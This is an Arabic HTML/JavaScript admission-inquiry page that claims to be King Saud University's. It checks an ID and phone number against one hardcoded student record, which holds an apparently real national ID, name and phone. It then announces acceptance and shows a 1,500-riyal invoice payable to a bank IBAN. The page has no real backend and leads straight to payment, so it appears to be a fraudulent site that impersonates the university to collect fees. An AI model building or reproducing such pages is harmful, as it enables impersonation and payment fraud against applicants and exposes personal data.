<!-- HTML -->
<div id="forms-section"></div>
<div id="results-section"></div>

<!-- زر الاستعلام -->
<div id="inquiry-card">
  <button class="submit-btn" onclick="showInquiryForm()">الاستعلام عن القبول</button>
</div>

<script>
// =================== بيانات الطلاب ===================
const studentData = {
    "1121094377": {
        name: "أملاك فواز غربي الشمري",
        degree: "بكالوريوس",
        major: "قانون تجاري",
        status: "مقبول",
        admissionDate: "2025/09/01",
        phone: "0501733515",
        fees: { tuition: 1500, registration: 0, books: 0, total: 1500 }
    }
};

let currentStudent = null;

// =================== دوال مساعدة ===================
function hideAllForms() {
    document.getElementById("forms-section").classList.add("hidden");
    document.getElementById("results-section").classList.add("hidden");
}

function scrollToElement(id) {
    document.getElementById(id).scrollIntoView({ behavior: "smooth", block: "start" });
}

// =================== الاستعلام عن القبول ===================
function showInquiryForm() {
    hideAllForms();
    document.getElementById("forms-section").classList.remove("hidden");
    document.getElementById("forms-section").innerHTML = `
        <h3>استعلام عن القبول</h3>
        <div class="form-group">
            <label>رقم الهوية:</label>
            <input type="text" id="inquiry-id">
        </div>
        <div class="form-group">
            <label>رقم الجوال:</label>
            <input type="text" id="inquiry-phone">
        </div>
        <button class="submit-btn" onclick="checkAdmission()">استعلام</button>
    `;
    scrollToElement("forms-section");
}

function checkAdmission() {
    const id = document.getElementById("inquiry-id").value;
    const phone = document.getElementById("inquiry-phone").value;

    if (!id || !phone) { alert("الرجاء إدخال رقم الهوية ورقم الجوال."); return; }

    if (studentData[id] && studentData[id].phone === phone) {
        currentStudent = studentData[id];
        showAdmissionResult();
    } else {
        alert("عذراً، لا توجد بيانات قبول مطابقة.");
    }
}

// =================== عرض نتيجة القبول ===================
function showAdmissionResult() {
    hideAllForms();
    document.getElementById("results-section").classList.remove("hidden");
    document.getElementById("results-section").innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم قبولك بنجاح!</h3>
                <p class="status-accepted">مبروك! تم قبولك في جامعة الملك سعود</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
                <div class="info-item"><label>حالة القبول:</label><span>${currentStudent.status}</span></div>
                <div class="info-item"><label>تاريخ القبول:</label><span>${currentStudent.admissionDate}</span></div>
            </div>
            <button class="submit-btn" onclick="showConfirmationSuccess()">تأكيد القبول</button>
        </div>
    `;
    scrollToElement("results-section");
}

// =================== تأكيد القبول ===================
function showConfirmationSuccess() {
    hideAllForms();
    document.getElementById("results-section").classList.remove("hidden");
    document.getElementById("results-section").innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم تأكيد قبولك بنجاح!</h3>
                <p class="status-accepted">مبروك! تم تأكيد قبولك في جامعة الملك سعود</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>
            <button class="submit-btn" onclick="showPaymentInvoice()">السداد</button>
        </div>
    `;
    scrollToElement("results-section");
}

// =================== عرض السداد ===================
function showPaymentInvoice() {
    hideAllForms();
    document.getElementById("results-section").classList.remove("hidden");
    document.getElementById("results-section").innerHTML = `
        <div class="result-card">
            <h3>فاتورة السداد</h3>
            <div class="student-info">
                <div class="info-item"><label>الطالب:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>
            <div class="invoice-details">
                <div class="info-item"><label>الرسوم الدراسية:</label><span>${currentStudent.fees.tuition} ريال</span></div>
                <div class="info-item"><label>رسوم التسجيل:</label><span>${currentStudent.fees.registration} ريال</span></div>
                <div class="info-item"><label>رسوم الكتب:</label><span>${currentStudent.fees.books} ريال</span></div>
                <div class="info-item"><label>المجموع الكلي:</label><span>${currentStudent.fees.total} ريال</span></div>
            </div>
            <div class="bank-info">
                <div class="info-item"><label>البنك:</label><span>البنك الراجحي السعودي</span></div>
                <div class="info-item"><label>الآيبان:</label><span>SA8280000859608014826386</span></div>
            </div>
        </div>
    `;
    scrollToElement("results-section");
}
</script>
